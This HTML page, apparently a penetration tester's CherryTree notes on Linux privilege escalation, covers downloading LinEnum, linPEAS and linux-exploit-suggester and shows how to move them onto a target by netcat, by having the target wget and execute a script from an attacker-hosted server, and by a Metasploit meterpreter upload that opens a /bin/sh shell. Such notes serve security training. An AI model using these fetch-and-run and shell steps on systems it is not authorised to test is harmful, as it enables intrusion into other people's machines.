<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Privilege Escalation</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Privilege Escalation</h1><br/><br />linenum<br /><div class="codebox"><pre>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</pre></div><br /><br />linpeas<br /><div class="codebox"><pre>wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh  </pre></div><br /><br />linux exploit suggester<br /><div class="codebox"><pre>wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh</pre></div><br />• to check if the kernel version is vulnerable<br />    ./linux-exploit-suggester.sh -k &lt;kernel-number&gt;<br />• all the uname<br />	./linux-exploit-suggester.sh -u &quot;Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux&quot;<br />• to run directly on the target machine if hava some CVE<br />	./linux-exploit-suggester.sh<br /><br /><br /><br />• <span style="text-decoration:underline;">netcat</span><br />    all traffic with netcat is unencrypted and may be detected by Intrusion Detection Systems or other anomalous traffic detection mechanisms implemented within an organization.<br />    It’s a quick, easy way to get files from one system to another, but not stealthy in any way. <br />   1) Target machine<br />       sets up a listener on the target to redirect incoming data (&gt;) to a new file<br />       <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>$ nc -l -p 1234 &gt; LinEnum.sh </pre></div><br />   2) Attacker machine<br />        connect to our target system while redirecting the contents of LinEnum.sh to the target<br />       <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># nc -w 3 &lt;target_ip&gt; 1234 &lt; LinEnum.sh</pre></div><br />   3) set the executable bit<br />       <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>$ <span style="color:#ff9d00;font-weight:700">chmod</span> +x LinEnum.sh</pre></div><br /><br />• <span style="text-decoration:underline;">wget</span><br />    attacker machine<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#ff9d00;font-weight:700">/</span>tmp<br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">wget</span> https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>rebootuser<span style="color:#ff9d00;font-weight:700">/</span>LinEnum<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>LinEnum.sh  <span style="color:#0088ff;font-weight:400">#need to be root to Download</span><br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">ls</span><br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># python3 -m http.server 80 -d <span style="color:#ff9d00;font-weight:700">/</span>tmp  <span style="color:#0088ff;font-weight:400">#need to be root, Set up HTTP server on the folder where we have saved the payload </span></pre></div><br />    target machine<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>$ <span style="color:#ff9d00;font-weight:700">wget</span> http<span style="color:#ff9d00;font-weight:700">://</span>&lt;IpAttacker&gt;<span style="color:#ff9d00;font-weight:700">/</span>LinEnum.sh   <span style="color:#0088ff;font-weight:400">#Download from the target machine</span><br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>$ <span style="color:#ff9d00;font-weight:700">chmod</span> +x LinEnum.sh<br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>$ .<span style="color:#ff9d00;font-weight:700">/</span>LinEnum.sh         <span style="color:#0088ff;font-weight:400">#Execute</span></pre></div><br /><br />• <span style="text-decoration:underline;">metasploit</span><br />    <div class="codebox"><pre>kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<br />kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">wget</span> https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>rebootuser<span style="color:#ff9d00;font-weight:700">/</span>LinEnum<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>LinEnum.sh      <span style="color:#0088ff;font-weight:400">#first we have to download the script</span><br />kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~$ msfconsole                                                                       <span style="color:#0088ff;font-weight:400">#run metasploit</span><br />msf&gt; spool <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span>LinEnumOutput.txt                                               <span style="color:#0088ff;font-weight:400">#save all output of metasploit on file</span><br />meterpreter &gt; upload <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span>LinEnum.sh <span style="color:#ff9d00;font-weight:700">.</span>                                          <span style="color:#0088ff;font-weight:400">#upload the scripts in the current directory(.)</span><br />meterpreter &gt; execute -f <span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/sh</span> -i -c                                                        <span style="color:#0088ff;font-weight:400">#shell on the linux target machine</span><br />shell&gt; <span style="color:#ff9d00;font-weight:700">chmod</span> +x LinEnum.sh                                                                    <span style="color:#0088ff;font-weight:400">#make executable the file</span><br />shell&gt; .<span style="color:#ff9d00;font-weight:700">/</span>LinEnum.sh                                                                           <span style="color:#0088ff;font-weight:400">#run the script</span><br />CTRL+C                                                                                        <span style="color:#0088ff;font-weight:400">#exit shell</span><br />CTRL+Z                                                                                        <span style="color:#0088ff;font-weight:400">#background meterpreter</span><br />msf&gt; spool off                                                                                <span style="color:#0088ff;font-weight:400">#end to save on file</span><br /></pre></div><br /></div>
</body>
</html>
